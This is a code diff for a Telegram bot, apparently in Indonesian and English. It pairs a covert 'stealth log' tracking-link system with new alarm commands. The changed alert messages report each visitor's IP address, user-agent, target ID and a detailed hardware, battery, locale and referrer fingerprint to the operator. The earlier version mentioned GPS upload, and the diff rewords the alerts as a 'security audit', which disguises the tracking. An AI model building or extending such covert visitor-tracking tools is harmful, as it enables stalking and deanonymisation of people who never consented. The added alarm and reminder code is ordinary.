@@ -104,14 +104,15 @@ async function startServer() {
     if (botInstance) {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       
-      let msg = `🚩 <b>Target access detected</b> 🚩\n` +
+      let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                `📅 <b>Time:</b> <code>${timestamp} WIB</code>\n` +
-                `🌐 <b>IP Address:</b> <code>${escapeHTML(String(ip))}</code>\n` +
-                `📁 <b>Template:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
-                `🖥️ <b>User-Agent:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
+                `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                `🌐 <b>IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n` +
+                `📦 <b>TEMPLATE:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
+                `🔑 <b>TARGET ID:</b> <code>${id}</code>\n\n` +
+                `🖥️ <b>BROWSER AGENT:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `⏳ <i>Uploading hardware & GPS data...</i>`;
+                `⏳ <i>STATUS: PROCESSING SECURITY AUDIT...</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
@@ -167,26 +168,27 @@ async function startServer() {
 
       let msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `📋 <b>Template Info</b>\n` +
-                  `├ Name: <code>${escapeHTML(templateName)}</code>\n` +
-                  `└ Flow: <code>Advanced Audit</code>\n\n` +
-                  `🖥️ <b>Hardware Specs</b>\n` +
-                  `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `├ Browser: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
-                  `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
-                  `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
-                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
-                  `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
-                  `🔋 <b>Energy & Perf</b>\n` +
-                  `├ Battery: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
-                  `├ Connect: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
-                  `├ Refresh: <code>${escapeHTML(data.refreshRate || 'Verified')}</code>\n` +
-                  `└ Gamut: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
-                  `🌍 <b>Region & Env</b>\n` +
-                  `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
-                  `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
+                  `📋 <b>OPERATION DETAILS:</b>\n` +
+                  `├ NAME: <code>${escapeHTML(templateName)}</code>\n` +
+                  `├ FLOW: <code>Advanced Security Audit</code>\n` +
+                  `└ ID: <code>${id}</code>\n\n` +
+                  `🖥️ <b>HARDWARE SYSTEM PROFILE:</b>\n` +
+                  `├ PLATFORM: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `├ BROWSER: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
+                  `├ CPU CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                  `├ MEMORY (EST): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ GRAPHICS: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                  `├ VM AUDIT: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
+                  `└ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🔋 <b>POWER & CONNECTIVITY:</b>\n` +
+                  `├ BATTERY: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
+                  `├ CONNECTION: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
+                  `├ REFRESH: <code>${escapeHTML(data.refreshRate || '60 Hz')}</code>\n` +
+                  `└ COLOR_GAMUT: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
+                  `🌍 <b>ENVIRONMENT & LOCALIZATION:</b>\n` +
+                  `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `├ LANGUAGES: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
+                  `└ REFERRER: <code>${escapeHTML(data.ref || 'Direct Connection')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
 
@@ -513,7 +515,7 @@ async function startServer() {
       [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
       [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
       [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
-      [Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
+      [Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
     ]);
 
     bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));
@@ -677,6 +679,21 @@ async function startServer() {
         link_preview_options: { is_disabled: true },
         ...kb
       }).catch(() => {});
+    });
+
+    bot.action('menu_alarm', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>⏰ ᴀʟᴀʀᴍ & ʀᴇᴍɪɴᴅᴇʀ ᴍᴏᴅᴜʟᴇ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/alarm [ᴍᴇɴɪᴛ]</b>\n` +
+        `  └ <i>ꜱᴇᴛ ᴀʟᴀʀᴍ ᴅᴀʟᴀᴍ ʜᴇᴛᴜɴɢᴀɴ ᴍᴇɴɪᴛ</i>\n\n` +
+        `• <b>/alarm [ᴊᴀᴍ:ᴍᴇɴɪᴛ]</b>\n` +
+        `  └ <i>ꜱᴇᴛ ᴀʟᴀʀᴍ ᴘᴀᴅᴀ ᴊᴀᴍ ᴛᴇʀᴛᴇɴᴛᴜ (ᴇ.ɢ. 07:00)</i>\n\n` +
+        `• <b>/listalarm</b>\n` +
+        `  └ <i>ᴄᴇᴋ ᴀʟᴀʀᴍ ʏᴀɴɢ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ</i>\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_help', (ctx) => {
@@ -1681,6 +1698,63 @@ async function startServer() {
       // Combine IP, Whois, and DNS (fake sequence for aesthetic, but performs work)
       setTimeout(() => ctx.reply(`📡 <i>DNS Module check completed. Use /dns ${target} for details.</i>`, { parse_mode: 'HTML' }), 2000);
       setTimeout(() => ctx.reply(`🌐 <i>IP/Whois analytics processed. Use /whois ${target} for full report.</i>`, { parse_mode: 'HTML' }), 4000);
+    });
+
+    // ALARM SYSTEM
+    const activeAlarms = new Map<number, any[]>();
+
+    bot.command('alarm', (ctx) => {
+      const args = ctx.message.text.split(' ')[1];
+      if (!args) return ctx.reply("Format: /alarm [menit] atau /alarm [hh:mm]");
+
+      let ms = 0;
+      let label = "";
+
+      if (args.includes(':')) {
+        const [h, m] = args.split(':').map(Number);
+        if (isNaN(h) || isNaN(m) || h < 0 || h > 23 || m < 0 || m > 59) {
+          return ctx.reply("❌ Format jam salah. Gunakan HH:MM (0-23:0-59)");
+        }
+        const now = new Date();
+        const target = new Date();
+        target.setHours(h, m, 0, 0);
+        if (target.getTime() <= now.getTime()) {
+           target.setDate(target.getDate() + 1); // Besok
+        }
+        ms = target.getTime() - now.getTime();
+        label = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}`;
+      } else {
+        const mins = parseInt(args);
+        if (isNaN(mins) || mins <= 0) return ctx.reply("❌ Masukkan jumlah menit yang valid.");
+        ms = mins * 60 * 1000;
+        label = `${mins} menit lagi`;
+      }
+
+      if (ms > 24 * 60 * 60 * 1000 * 7) return ctx.reply("❌ Alarm maksimal 7 hari.");
+
+      const alarmId = setTimeout(() => {
+        ctx.reply(`⏰ <b>ALARM BUNYI!</b>\n━━━━━━━━━━━━━\nWaktu: ${label}`, { parse_mode: 'HTML' });
+        const userAlarms = activeAlarms.get(ctx.from.id) || [];
+        activeAlarms.set(ctx.from.id, userAlarms.filter(a => a.id !== alarmId));
+      }, ms);
+
+      const userAlarms = activeAlarms.get(ctx.from.id) || [];
+      userAlarms.push({ id: alarmId, time: label, targetTime: Date.now() + ms });
+      activeAlarms.set(ctx.from.id, userAlarms);
+
+      ctx.reply(`✅ <b>Alarm diset!</b>\nSekitar: ${label}`, { parse_mode: 'HTML' });
+    });
+
+    bot.command('listalarm', (ctx) => {
+      const userAlarms = activeAlarms.get(ctx.from.id) || [];
+      if (userAlarms.length === 0) return ctx.reply("📭 Tidak ada alarm aktif.");
+
+      let msg = `⏰ <b>ALARM AKTIF ANDA</b>\n━━━━━━━━━━━━━\n`;
+      userAlarms.forEach((a, i) => {
+        const remaining = Math.round((a.targetTime - Date.now()) / 60000);
+        msg += `${i+1}. <b>${a.time}</b> (~${remaining} mnt lagi)\n`;
+      });
+      ctx.reply(msg, { parse_mode: 'HTML' });
     });
 
     let retryCount = 0;
